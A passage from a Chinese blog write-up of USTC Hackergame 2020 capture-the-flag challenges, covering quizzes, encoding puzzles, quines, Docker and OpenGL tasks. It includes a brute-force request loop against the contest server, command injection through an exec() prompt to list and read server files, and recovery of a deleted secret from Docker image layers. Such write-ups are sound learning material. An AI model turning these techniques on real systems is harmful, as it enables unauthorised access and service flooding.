URLs」的选项，可以在地址栏上右键后从菜单中开启。</p></blockquote>\n<h2>猫咪问答++</h2>\n<blockquote><ol>\n<li>以下编程语言、软件或组织对应标志是哺乳动物的有几个？<br>Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce.<br>提示：学术上一般认为龙不属于哺乳动物。</li>\n<li>第一个以信鸽为载体的 IP 网络标准的 RFC 文档中推荐使用的 MTU (Maximum Transmission Unit) 是多少毫克？<br>提示：咕咕咕，咕咕咕。</li>\n<li>USTC Linux 用户协会在 2019 年 9 月 21 日自由软件日活动中介绍的开源游戏的名称共有几个字母？<br>提示：活动记录会在哪里？</li>\n<li>中国科学技术大学西校区图书馆正前方（西南方向） 50 米 L 型灌木处共有几个连通的划线停车位？<br>提示：建议身临其境。</li>\n<li>中国科学技术大学第六届信息安全大赛所有人合计提交了多少次 flag？<br>提示：是一个非负整数。</li>\n</ol></blockquote>\n<p>其中，第二题、第三题、第五题的答案分别可以在下述 URL 中找到：</p>\n<ul>\n<li>\n<a href=\"https://tools.ietf.org/html/rfc1149\">RFC1149 - A Standard for the Transmission of IP Datagrams on Avian Carriers</a>：信鸽的典型 MTU 是 256 毫克</li>\n<li>\n<a href=\"https://news.ustclug.org/2019/09/2019-sfd-ustc/\">2019 软件自由日中国科大站 - USTC LUG</a>：开源游戏的名称是 Teeworlds、有 9 个字母</li>\n<li><a href=\"https://news.ustclug.org/2019/12/hackergame-2019/\">中国科学技术大学第六届信息安全大赛圆满结束 - USTC LUG</a></li>\n</ul>\n<p>至于第一题要搜索二十几种吉祥物、一不小心还会数错，第四题要去找卫星图像或者街景图，大尾巴狐狸太懒了、不想搜索了！有没有别的方法获取 flag？</p>\n<p>第一题给了 23 种编程语言、软件或组织：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-string\">\"Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce\"</span>.split(<span class=\"hljs-string\">'，'</span>).length<span class=\"hljs-comment\">// 23</span></code></pre>\n<p>至于图书馆前的地上停车位、总不可能超过 100 个吧？</p>\n<p>那么，写一个遍历跑第一题和第四题的答案，总会跑出 Flag 的！</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">1</span>; i &lt; <span class=\"hljs-number\">23</span>; i++) { <span class=\"hljs-comment\">// 至少有 1 种哺乳动物；既然提示了龙不是哺乳动物，那么肯定不会 23 种前部都是</span>  <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> j = <span class=\"hljs-number\">0</span>; j &lt; <span class=\"hljs-number\">100</span>; j++) { <span class=\"hljs-comment\">// 一个停车位都没有的可能性不是没有，遍历时要考虑进去</span>    <span class=\"hljs-keyword\">const</span> formData = <span class=\"hljs-keyword\">new</span> FormData();    formData.append(<span class=\"hljs-string\">'q1'</span>, i);    formData.append(<span class=\"hljs-string\">'q2'</span>, <span class=\"hljs-number\">256</span>);    formData.append(<span class=\"hljs-string\">'q3'</span>, <span class=\"hljs-number\">9</span>);    formData.append(<span class=\"hljs-string\">'q4'</span>, j);    formData.append(<span class=\"hljs-string\">'q4'</span>, <span class=\"hljs-number\">17098</span>);    fetch(<span class=\"hljs-string\">'http://202.38.93.111:10001/'</span>, {      <span class=\"hljs-attr\">body</span>: formData,      <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'POST'</span>,    }).then(<span class=\"hljs-function\"><span class=\"hljs-params\">resp</span> =&gt;</span> resp.text()).then(<span class=\"hljs-function\"><span class=\"hljs-params\">text</span> =&gt;</span> {      <span class=\"hljs-keyword\">if</span> (!text.includes(<span class=\"hljs-string\">'没有全部答对，不能给你 flag'</span>)) {        <span class=\"hljs-built_in\">console</span>.log(i, j, text);      }    });  }}</code></pre>\n<p>果然，<del>通过对比赛平台的 CC 攻击</del>，很快就把第一题和第四题答案跑出来了：第一题的答案是 12、第四题的答案是 9。输入正确答案提交即可获取 flag。</p>\n<h2>2048</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/4.png\" width=\"680\" height=\"888\" class=\"lazy post-img\"></p>\n<p>毫无疑问，这道题如果真的玩到 2048 获取 Flag 是肯定可行的，但是我懒；同样的原因，我也不想对这个网站里每个 JS 都审计一次。既然如此，不如先随便玩玩，看看这道题的 Flag 大概会藏在哪里。</p>\n<p>随便乱敲方向键刻意使 Game Over，DevTools 截获了一个 HTTP 请求、是 <code>html_actuator.js</code> 第 164 行发起的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/5.png\" width=\"1862\" height=\"712\" class=\"lazy post-img\"></p>\n<p>现在我们直接审计 <code>html_actuator.js</code> 就好了，把发起 AJAX 请求的函数找出来：</p>\n<pre><code class=\"hljs js\">HTMLActuator.prototype.message = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">won</span>) </span>{  <span class=\"hljs-keyword\">var</span> type    = won ? <span class=\"hljs-string\">\"game-won\"</span> : <span class=\"hljs-string\">\"game-over\"</span>;  <span class=\"hljs-keyword\">var</span> message = won ? <span class=\"hljs-string\">\"FLXG 大成功！\"</span> : <span class=\"hljs-string\">\"FLXG 永不放弃！\"</span>;  <span class=\"hljs-keyword\">var</span> url;  <span class=\"hljs-keyword\">if</span> (won) {    url = <span class=\"hljs-string\">\"/getflxg?my_favorite_fruit=\"</span> + (<span class=\"hljs-string\">'b'</span>+<span class=\"hljs-string\">'a'</span>+ +<span class=\"hljs-string\">'a'</span>+<span class=\"hljs-string\">'a'</span>).toLowerCase();  } <span class=\"hljs-keyword\">else</span> {    url = <span class=\"hljs-string\">\"/getflxg?my_favorite_fruit=\"</span>;  }  <span class=\"hljs-keyword\">let</span> request = <span class=\"hljs-keyword\">new</span> XMLHttpRequest();  request.open(<span class=\"hljs-string\">'GET'</span>, url);  request.responseType = <span class=\"hljs-string\">'text'</span>;  request.onload = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>) </span>{    <span class=\"hljs-built_in\">document</span>.getElementById(<span class=\"hljs-string\">\"game-message-extra\"</span>).innerHTML = request.response;  };  request.send();  <span class=\"hljs-built_in\">this</span>.messageContainer.classList.add(type);  <span class=\"hljs-built_in\">this</span>.messageContainer.getElementsByTagName(<span class=\"hljs-string\">\"p\"</span>)[<span class=\"hljs-number\">0</span>].textContent = message;  <span class=\"hljs-built_in\">this</span>.clearContainer(<span class=\"hljs-built_in\">this</span>.sharingContainer);  <span class=\"hljs-built_in\">this</span>.sharingContainer.appendChild(<span class=\"hljs-built_in\">this</span>.scoreTweetButton());};</code></pre>\n<p>看了代码就知道怎么获取 Flag 了，直接 GET <code>/getflxg?my_favorite_fruit=banana</code> 即可。</p>\n<blockquote><p>小彩蛋，在 JavaScript 中字符串类型 <code>String</code> 转换成数字类型 <code>Number</code> 时会得到 <code>NaN</code>，凑成了 <code>banana</code>。</p></blockquote>\n<h2>一闪而过的 Flag</h2>\n<blockquote>\n<p>…… <strong>程序每次运行时隐约可见黑色控制台上有 flag 一闪而过。</strong></p>\n<p>……</p>\n<p>而你作为一名新生，不由动了恻隐之心。望着诗人潇洒远去的背影，你可以赶在下午诗人回来之前，帮助这位可怜的人，用 flag 装满他的饭盒吗?</p>\n<p><a href=\"https://archive.org/details/untitled-01_exe\">打开/下载题目</a> （Hosted at Internet Archive）</p>\n</blockquote>\n<p>欺负苏卡卡用 macOS 不用 Windows，哼！苏卡卡才不会重启到 Windows 就为了看个 flag 呢，Parallels Desktop 启动！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/21.png\" width=\"1423\" height=\"781\" class=\"lazy post-img\"></p>\n<p>没有什么是截图解决不了的。。。啊，什么？还要区分 <code>i I 1 l</code>？<del>当然是猜 flag 啦</del></p>\n<p>小 Tip，打开 CMD、左上角图标右键、「默认值」，是可以设置「控制台窗口」默认字体和字号的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/22.png\" width=\"800\" height=\"440\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/23.png\" width=\"800\" height=\"440\" class=\"lazy post-img\"></p>\n<p>改了字体以后，这不就分得清清楚楚啦！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/24.png\" width=\"1067\" height=\"586\" class=\"lazy post-img\"></p>\n<h2>从零开始的记账工具人</h2>\n<blockquote>\n<p>如同往常一样，你的 npy 突然丢给你一个购物账单：“我今天买了几个小玩意，你能帮我算一下一共花了多少钱吗？”</p>\n<p>你心想：<del>又双叒叕要开始吃土了</del> 这不是很简单吗？电子表格里面一拖动就算出来了</p>\n<p>只不过拿到账单之后你才注意到，似乎是为了剁手时更加的安心，这次的账单上面的金额全使用了中文大写数字</p>\n<p><strong>注意：请将账单总金额保留小数点后两位，放在 <code>flag{}</code> 中提交，例如总金额为 123.45 元时，你需要提交 <code>flag{123.45}</code></strong></p>\n</blockquote>\n<p>这道题上来继续欺负苏卡卡没有在 macOS 上安装 Office，<del>大尾巴狐狸非常生气</del>。你看 npm 上这个能解析 <code>xlsx</code> 文件的 SheetJS、大写数字转小写的 nzh 还蛮好用的。Node.js 代码如下：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> XLSX = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'xlsx'</span>); <span class=\"hljs-comment\">// 解析 xlsx 用</span><span class=\"hljs-keyword\">const</span> NzhCN = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'nzh/cn'</span>); <span class=\"hljs-comment\">// 大写数字转小写</span><span class=\"hljs-keyword\">const</span> xlsx = XLSX.readFile(<span class=\"hljs-string\">'./bills.xlsx'</span>); <span class=\"hljs-comment\">// 当然你要先把 xlsx 文件下载下来</span><span class=\"hljs-keyword\">const</span> data = XLSX.utils.sheet_to_json(xlsx.Sheets[xlsx.SheetNames[<span class=\"hljs-number\">0</span>]]);<span class=\"hljs-keyword\">let</span> count = <span class=\"hljs-number\">0</span>;data.forEach(<span class=\"hljs-function\"><span class=\"hljs-params\">row</span> =&gt;</span> {  <span class=\"hljs-keyword\">const</span> moneyData = { <span class=\"hljs-attr\">yuan</span>: <span class=\"hljs-number\">0</span>, <span class=\"hljs-attr\">jiao</span>: <span class=\"hljs-number\">0</span>, <span class=\"hljs-attr\">fen</span>: <span class=\"hljs-number\">0</span> };  <span class=\"hljs-comment\">// nzh 不支持处理金额，需要自己实现一个</span>  <span class=\"hljs-keyword\">let</span> tmp;  [[<span class=\"hljs-string\">'元'</span>, <span class=\"hljs-string\">'yuan'</span>], [<span class=\"hljs-string\">'角'</span>, <span class=\"hljs-string\">'jiao'</span>], [<span class=\"hljs-string\">'分'</span>, <span class=\"hljs-string\">'fen'</span>]].forEach(<span class=\"hljs-function\">(<span class=\"hljs-params\">[i, dataKey]</span>) =&gt;</span> {    tmp = (tmp || row[<span class=\"hljs-string\">'单价'</span>]).split(i);    <span class=\"hljs-keyword\">if</span> (tmp.length === <span class=\"hljs-number\">1</span>) {      tmp = tmp[<span class=\"hljs-number\">0</span>]    } <span class=\"hljs-keyword\">else</span> {      moneyData[dataKey] = NzhCN.decodeB(tmp[<span class=\"hljs-number\">0</span>]);      tmp = tmp[<span class=\"hljs-number\">1</span>]    }  });  <span class=\"hljs-comment\">// 处理金额时，要小心浮点数大坑哟</span>  <span class=\"hljs-keyword\">const</span> value = moneyData.yuan * <span class=\"hljs-number\">100</span> + moneyData.jiao * <span class=\"hljs-number\">10</span> + moneyData.fen;  count = count + value * row[<span class=\"hljs-string\">'数量'</span>];});<span class=\"hljs-built_in\">console</span>.log(<span class=\"hljs-string\">`flag{<span class=\"hljs-subst\">${(count<span class=\"hljs-regexp\">/100).toFixed(2)}}`); /</span><span class=\"hljs-regexp\">/ 直接打印 flag</span></span></span></code></pre>\n<h2>超简单的世界模拟器</h2>\n<blockquote>\n<p>……</p>\n<p>你的任务是在生命游戏的世界中，复现出蝴蝶扇动翅膀，引起大洋彼岸风暴的效应。</p>\n<p>通过改变左上角 15x15 的区域，在游戏演化 200 代之后，如果被特殊标注的正方形内的细胞被“清除”，你将会得到对应的 flag：</p>\n<p>“清除”任意一个正方形，你将会得到第一个 flag。同时“清除”两个正方形，你将会得到第二个 flag。</p>\n</blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.5/26.png\" width=\"919\" height=\"936\" class=\"lazy post-img\"></p>\n<p>在 Google 上搜索「生命游戏」，找到了一个知乎提问和 <a href=\"https://www.conwaylife.com/wiki/Main_Page\">Conway Life Game Wiki</a>。大概了解康威生命游戏是什么后就理解了题目的要求：要在 15x15 的范围内构建一个生命游戏图形、在演化到 200 代之后会清除两个种群。</p>\n<p>第一个 Payload 是一艘最简单的会向右平移「飞船」（这个图形在知乎或是 Life Game Wiki 上都可以被轻易找到），可以直接摧毁第一个种群：</p>\n<pre><code class=\"hljs plaintext\">00000110111101101100011</code></pre>\n<p>第二个 Payload 是我一不小心试出来的，由一个平移的「飞船」和一个沿着斜对角线行走的「滑翔者」共同组成，他们会「擦弹」引发「大爆炸」，在 80 代左右摧毁第一个种群、在 160 代左右摧毁第二个种群：</p>\n<pre><code class=\"hljs plaintext\">0000011011110110110001100001101011</code></pre>\n<h2>从零开始的火星文生活</h2>\n<blockquote>\n<p>……</p>\n<p>L 同学打开附件一看，傻眼了，全都是意义不明的汉字。机智的 L 同学想到 Q 同学平时喜欢使用 <strong>GBK 编码</strong>，也许是打开方式不对。结果用 GBK 打开却看到了一堆夹杂着日语和数字的<strong>火星文</strong>……</p>\n<p>L 同学彻底懵逼了，几经周折，TA 找到了科大最负盛名的火星文专家 (你)。依靠多年的字符编码解码的经验，你可以破译 Q 同学发来的火星文是什么意思吗？</p>\n<p>注：正确的 flag 全部由 <strong>ASCII</strong> 字符组成！</p>\n</blockquote>\n<p>这种 GBK、UTF-8 之间的火星文编码问题，直接给一个 Unix 下的 <strong>万能解法</strong>：</p>\n<pre><code class=\"hljs bash\">cat gibberish_message.txt | iconv -f utf8 -t gbk | iconv -f utf8 -t latin1 | iconv -f gbk -t utf8</code></pre>\n<p>剩下要做的，就是把全角转换成半角了。</p>\n<h2>自复读的复读机</h2>\n<blockquote>\n<p>能够复读其他程序输出的程序只是普通的复读机。</p>\n<p>顶尖的复读机还应该能复读出自己的源代码。</p>\n<p>什么是国际复读机啊（战术后仰）</p>\n<p>你现在需要编写两个只有一行 Python 代码的顶尖复读机：</p>\n<ul>\n<li>其中一个要输出代码本身的逆序（即所有字符从后向前依次输出）</li>\n<li>另一个是输出代码本身的 sha256 哈希值，十六进制小写</li>\n</ul>\n<p>满足两个条件分别对应了两个 flag。</p>\n<p>快来开始你的复读吧~</p>\n</blockquote>\n<p>访问题目，输出的提示信息是：</p>\n<pre><code class=\"hljs plaintext\">Your one line python code to exec():</code></pre>\n<p>什么，可以 <code>exec()</code> 啊？那大尾巴狐狸直接干坏事了：</p>\n<pre><code class=\"hljs plaintext\">Your one line python code to exec(): import os; os.system(\"ls\")</code></pre>\n<p>发现目录下面有一个 <code>checker.py</code> 和一个 <code>runner.py</code>。接着用 <code>os.system(\"cat *.py\")</code> 获得题目源码：</p>\n<pre><code class=\"hljs python\"><span class=\"hljs-comment\"># checker.py</span><span class=\"hljs-keyword\">import</span> subprocess<span class=\"hljs-keyword\">import</span> hashlib<span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">\"__main__\"</span>:    code = <span class=\"hljs-built_in\">input</span>(<span class=\"hljs-string\">\"Your one line python code to exec(): \"</span>)    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-keyword\">if</span> <span class=\"hljs-keyword\">not</span> code:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Code must not be empty\"</span>)        exit(-<span class=\"hljs-number\">1</span>)    p = subprocess.run(        [<span class=\"hljs-string\">\"su\"</span>, <span class=\"hljs-string\">\"nobody\"</span>, <span class=\"hljs-string\">\"-s\"</span>, <span class=\"hljs-string\">\"/bin/bash\"</span>, <span class=\"hljs-string\">\"-c\"</span>, <span class=\"hljs-string\">\"/usr/local/bin/python3 /runner.py\"</span>],        <span class=\"hljs-built_in\">input</span>=code.encode(),        stdout=subprocess.PIPE,    )    <span class=\"hljs-keyword\">if</span> p.returncode != <span class=\"hljs-number\">0</span>:        <span class=\"hljs-built_in\">print</span>()        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Your code did not run successfully\"</span>)        exit(-<span class=\"hljs-number\">1</span>)    output = p.stdout.decode()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Your code is:\"</span>)    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">repr</span>(code))    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Output of your code is:\"</span>)    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">repr</span>(output))    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Checking reversed(code) == output\"</span>)    <span class=\"hljs-keyword\">if</span> code[::-<span class=\"hljs-number\">1</span>] == output:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">\"/root/flag1\"</span>).read())    <span class=\"hljs-keyword\">else</span>:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Failed!\"</span>)    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Checking sha256(code) == output\"</span>)    <span class=\"hljs-keyword\">if</span> hashlib.sha256(code.encode()).hexdigest() == output:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">\"/root/flag2\"</span>).read())    <span class=\"hljs-keyword\">else</span>:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Failed!\"</span>)<span class=\"hljs-comment\"># runner.py</span><span class=\"hljs-built_in\">exec</span>(<span class=\"hljs-built_in\">input</span>())</code></pre>\n<blockquote><p>不要想着直接 <code>exec()</code> 偷 flag 了，你以为这比赛是 ylb 搞的啊？</p></blockquote>\n<p>可以看到「反向复读」的检查中使用了 <code>[::-1]</code> 倒序，所以在构造反向复读的语句中也应该使用 <code>[::-1]</code>。</p>\n<p>首先是构建正向复读的语句，在 Google 中 <del>盲目</del> 搜索的过程中确定了关键词「Quine Python」、找到了 <a href=\"https://www.geeksforgeeks.org/quine-in-python/\">这个网站</a>，介绍了如下语句：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">'_=%r;print (_%%_)'</span>;<span class=\"hljs-built_in\">print</span> (_%_)</code></pre>\n<p>那个网站也给出了这个语句的详细解释，不过简单来说，我们利用了 <code>print</code> 字符格式化、通过 <code>%r</code>（当然也可以用 <code>%s</code>）获得 <code>_</code> 变量的取值；而在 <code>_</code> 变量中使用了 <code>%%</code> 防止 <code>%</code> 被转义。</p>\n<p>既然有了正向复读，稍加改动即可得到反向复读。首先在 <code>print(_&amp;_)</code> 中加上 <code>[::-1]</code> 获得倒叙，同时也要对应修改 <code>_</code> 变量：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">')]1-::[_%%_(tnirp;%r=_'</span>;<span class=\"hljs-built_in\">print</span>(_%_[::-<span class=\"hljs-number\">1</span>])</code></pre>\n<p>信心满满地去提交，结果 Check Failed，发现 <code>print</code> 在结尾带上了换行符。所以再为 <code>print</code>再加上 <code>end=\"\"</code> 即可：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">')\"\"=dne,]1-::[_%%_(tnirp;%r=_'</span>;<span class=\"hljs-built_in\">print</span>(_%_[::-<span class=\"hljs-number\">1</span>],end=<span class=\"hljs-string\">\"\"</span>)</code></pre>\n<p>成功获得第一个 flag。</p>\n<h2>233 同学的字符串工具</h2>\n<blockquote>\n<p>233 同学最近刚刚学会了 Python 的字符串操作，于是写了两个小程序运行在自己的服务器上。这个工具提供两个功能：</p>\n<ul>\n<li>字符串大写工具</li>\n<li>UTF-7 到 UTF-8 转换工具</li>\n</ul>\n<p>除了点击下方的打开题目按钮使用网页终端，你也可以通过 <code>nc 202.38.93.111 10233</code> 命令连接到 233 同学的服务上。你可以在这里看到 233 同学的源代码: <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-string_tool-py\">string_tool.py</a>。</p>\n</blockquote>\n<p>这一道题我先拿到了第二个 flag 后才拿到了第一个 flag。首先在 <code>www.string-function.com</code> 这个网站上找到了 UTF-7 和 ASCII 编码互换表： <a href=\"http://string-functions.com/encodingtable.aspx?encoding=65000&amp;decoding=20127\">UTF-7 =&gt; ASCII</a> <a href=\"http://string-functions.com/encodingtable.aspx?encoding=20127&amp;decoding=65000\">ASCII =&gt; UTF-7</a>，照着表（加上一些简单的推算）将 <code>flag</code> 编码成 <code>+AGYAbABhAGc-</code>、成功拿到第二个 flag。</p>\n<p>获得第二个 flag 以后，决定根据相同的思路去查 Unicode sheet，但是直到后来经过提醒才想起来有「<a href=\"https://en.wikipedia.org/wiki/Orthographic_ligature\">合字</a>」这种神奇的存在，最终利用 <a href=\"https://www.compart.com/en/unicode/U+FB02#UNC_DB\"><code>U+FB02</code></a> 构造出 Payload 获得第一个 flag。</p>\n<h2>233 同学的 Docker</h2>\n<blockquote>\n<p>233 同学在软工课上学到了 Docker 这种方便的东西，于是给自己的字符串工具项目写了一个 Dockerfile。</p>\n<p>但是 233 同学突然发现它不小心把一个私密文件（<code>flag.txt</code>）打包进去了，于是写了一行命令删掉这个文件。</p>\n<p>「既然已经删掉了，应该不会被人找出来吧？」233 想道。</p>\n</blockquote>\n<p>首先让我们 <a href=\"https://hub.docker.com/layers/8b8d3c8324c7/stringtool/latest/images/sha256-aef87a00ad7a4e240e4b475ea265d3818c694034c26ec227d8d4f445f3d93152?context=explore\">看看这个 Docker Image 是怎么构建的</a>（不需要用 image 反推 Dockerfile 这种奇技淫巧，DockerHub 可以直接查看 Public 的 Docker Images 的构建过程），可以发现 233 同学首先把所有文件都添加到 Docker Image 中、再通过 <code>/bin/sh -c rm /code/flag.txt</code> 删除了 <code>flag.txt</code>。</p>\n<p>由于 Docker Image 在构建时每一个 RUN 都会新建一个 Layer，因此即使 233 同学通过 RUN 删掉了 <code>flag.txt</code>，flag 肯定还存在于某个地方，而且「某个地方」就包括本机的 <code>/var/lib/docker/overlay2</code> ：</p>\n<pre><code class=\"hljs bash\">$ docker run 8b8d3c8324c7/stringtool <span class=\"hljs-comment\"># 下载执行 8b8d3c8324c7/stringtool</span>[Redacted]Nothing here... <span class=\"hljs-comment\"># Docker Image 执行的输出</span>$ <span class=\"hljs-built_in\">cd</span> /var/lib/docker/overlay2$ find -name flag.txt./befaa134f7d0cc9e964e7790b7c11dde6d0df3104cd88667f7676e46f409705f/diff/code/flag.txt./8c07cc3c01c52b8cf0684518e68a31bfb1f843392f973fef9add587d554c6fab/diff/code/flag.txt<span class=\"hljs-comment\"># Duang，flag.txt 它出现了</span>$ <span class=\"hljs-built_in\">cd</span> befaa134f7d0cc9e964e7790b7c11dde6d0df3104cd88667f7676e46f409705f/diff/code/$ cat flag.txt<span class=\"hljs-comment\"># flag 到手，嘿嘿</span></code></pre>\n<h2>从零开始的 HTTP 链接</h2>\n<blockquote>\n<p>众所周知，数组下标应当从 0 开始。</p>\n<p>同样的，TCP 端口也应当从 0 开始。为了实践这一点，我们把一个网站架设在服务器的 0 号端口上。</p>\n<p>你能成功连接到 0 号端口并拿到 flag 吗？</p>\n<p><strong>点击下面的打开题目按钮是无法打开网页的，因为普通的浏览器会认为这是无效地址。</strong></p>\n</blockquote>\n<p>TCP/IP 中「端口」这个概念，甚至早于互联网的发明：早在 ARPANET 网中的供电协议中就有 8 个比特用于决定应该由计算机上的哪个程序接收该信息（当时这 8 个比特被称为 AEN、Another Eight Numbers），可以参考我之前翻译的一篇文章「<a href=\"https://blog.skk.moe/post/history-of-url/\">URL 的历史</a>」。现在 TCP 的端口共有 16 个比特（最大支持到 65535）。其中，端口 0 作为保留端口，所以依然是可用的。虽然部分浏览器无法访问，这并不意味着 netcat 不能访问，对吧！</p>\n<p>当然这道题有几个坑点：</p>\n<ol>\n<li>现有发行版中分发的 <code>netcat</code> 都不是「原版」的，试图连接 Port 0 会报「Invalid Port」。因此可以选择直接手撸 Socket、或者更换另一个版本的 <code>netcat</code>。</li>\n<li>就算使用了合适的工具，由于 Darwin 的 XNU Kernel 非常鸡贼地阻止使用端口 0，所以在 macOS 上也依然没法做这道题。我不得不在 codeanywhere 上开了一个 Linux Container 跑这道题。</li>\n</ol>\n<p>和 HTTP/2 基于二进制帧不同，HTTP/0.9、HTTP/1.0、HTTP/1.1 协议都是基于明文的，因此可以手敲 Header：</p>\n<pre><code class=\"hljs bash\">nc 202.38.93.111 0GET / HTTP/1.1Host: 202.38.93.111Connection: close</code></pre>\n<p>接着终端里会打印出来一串 HTML、隐约还可以看见 <code>xterm.js</code>，这不就是 Hackergame 的 Web 端做题界面嘛！由于去年在参与 USTC Hackergame 时就研究过这个界面、已经知道交互是通过 <code>/shell</code> 路径下的 WebSocket 连接实现的。因此直接使用 <a href=\"https://github.com/vi/websocat\">websocat</a> 完成 WebSocket 交互，就和 netcat 一样：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># 如果没有 websocat 的话</span>$ wget https://github.com/vi/websocat/releases/download/v1.6.0/websocat_nossl_amd64-linux$ chmod +x websocat_nossl_amd64-linux<span class=\"hljs-comment\"># 开始获取 Flag</span>$ ./websocat_nossl_amd64-linux ws://202.38.93.111:0/shellPlease input your token: [Redacted]<span class=\"hljs-comment\"># Flag 到手！</span></code></pre>\n<h2>超简陋的 OpenGL 小程序</h2>\n<blockquote>\n<p>年轻人的第一个 OpenGL 小程序。</p>\n<p>（嗯，有什么被挡住了？）</p>\n</blockquote>\n<p><a href=\"https://archive.org/details/glhackergame_2020\">下载地址</a> （Hosted at Internet Archive）</p>\n<p>由于苏卡卡是参赛的两千多名选手中最菜的那一个、完全不懂 OpenGL、完全不懂图形学，为了做这道题不得不去翻了一下「Learn OpenGL CN」，知道了 VS（Vertex Shader）是顶点着色器、可以处理顶点属性确定形状，和 FS（Fragment Shader）是片段着色器、可以算颜色，然后就开始硬上了。在花了半个小时盲目乱改 VS 的参数后，成功让「犹抱琵琶半遮面」的 flag 露出了右上角：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/16.jpg\" width=\"1280\" height=\"571\" class=\"lazy post-img\"></p>\n<p>凭借着漏出来的部分，我成功认出了 <code>l</code>、<code>Graphic</code>、<code>Happy</code>、<code>(233);</code>。剩下的就要靠猜了，我猜过的 flag 有：</p>\n<ul>\n<li>\n<code>flag{GraphicHappy(223);}</code> （整体长度都不对）</li>\n<li>\n<code>flag{GraphicsHappy(223);}</code> （ <code>c</code> 和 <code>H</code> 之间还有个类似 <code>c</code> 的字母、那就是 <code>s</code> 了，不过还是不够长）</li>\n<li>\n<code>flag{gl_GraphicsHappy(223);}</code> （OpenGL 里不少 <code>gl_</code> 前缀，加上认出来一个 <code>l</code>，试试看）</li>\n<li>\n<code>flag{glGraphicsHappy(223);}</code> （<code>l</code> 和 <code>G</code> 之间的距离没那么长，终于猜对了）</li>\n</ul>\n<blockquote><p>这道题的正确解法是利用未被使用的向量 <code>Normal</code>。苏卡卡虽然有注意到 Normal 未被使用过，但是由于完全不会 OpenGL、并不知道怎么添加向量。</p></blockquote>\n<p>这种解法没什么好自豪的，你看这只大尾巴狐狸就是逊啦。</p>\n<h2>来自未来的信笺</h2>\n<blockquote>\n<p>你收到了一封邮件。没有标题，奇奇怪怪的发件人，和一份奇怪的附件。日期显示的是 3020 年 10 月 31 日。</p>\n<p>“Send from Arctic.” 正文就只有这一句话。</p>\n<p>「谁搞的恶作剧啊……话说这竟然没有被垃圾邮件过滤器过滤掉？」你一边嘟囔着一边解压了附件——只看到一堆二维码图片。</p>\n<p>看起来有点意思。你不禁想试试，能否从其中得到什么有意义的东西。</p>\n</blockquote>\n<p>谁会在 1000 年以后从北极给你发一封电子邮件？那当然是 <a href=\"https://archiveprogram.github.com/\">GitHub Archive Program</a> 啦 —— 今年年初，GitHub 将现存的活跃开源项目全部以二维码的形式刻录在胶片上、埋进了北极世界档案馆（AWA，位于斯瓦尔巴群岛一个位于北极冻土之下的废弃煤矿中，和 Global Seed Vault 仅一英里之遥）中。为了做这道题，让我们读一读 GitHub Archive Program 为「后人」提供的指南：</p>\n<ul>\n<li><p>「<a href=\"https://github.com/github/archive-program/blob/master/GUIDE.md\">A Guide To the GitHub Code Vault</a>」</p></li>\n<li><p>「<a href=\"https://github.com/github/archive-program/blob/master/GUIDE_zh.md\">GitHub Code Vault 指南（简体中文）</a>」</p></li>\n</ul>\n<p>这里摘抄简体中文版指南的一部分内容：</p>\n<blockquote>\n<p>每个二维码由一个个白色或黑色小方块组成，该等小方块几乎占据胶片的整个帧。 使用二维码的原因在于，其比人类可读的文本更紧凑而可靠。 二维码可解码为二进制数据，即一系列 1 和 0。</p>\n<p>……</p>\n<p>我们可将 TAR 文件嵌套进 TAR 